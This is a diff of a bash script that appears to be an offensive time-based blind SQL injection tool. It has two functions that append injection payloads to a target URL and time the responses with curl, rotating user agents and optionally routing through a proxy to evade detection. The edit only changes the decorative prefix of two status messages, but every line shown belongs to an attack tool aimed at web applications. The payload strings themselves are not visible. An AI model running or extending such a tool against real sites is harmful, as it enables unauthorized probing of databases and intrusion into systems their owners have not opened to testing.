@@ -74,7 +74,7 @@ vector_sqli_agressor_left() {
         
         local final_query="${defiance_tamper_path}${query_payload}"
         
-        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
+        echo -e "\e[0;33m[ \e[0m:\e[0;34m) ]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
         
         local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
         
@@ -105,7 +105,7 @@ vector_sqli_agressor_right() {
         
         local final_query="${defiance_tamper_path}${query_payload}"
         
-        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
+        echo -e "\e[0;33m[ \e[0m:\e[0;34m) ]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[0;34m$target_url$final_query\e[0m"
         
         local stopwatch=$(curl $proxy_flag -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
         
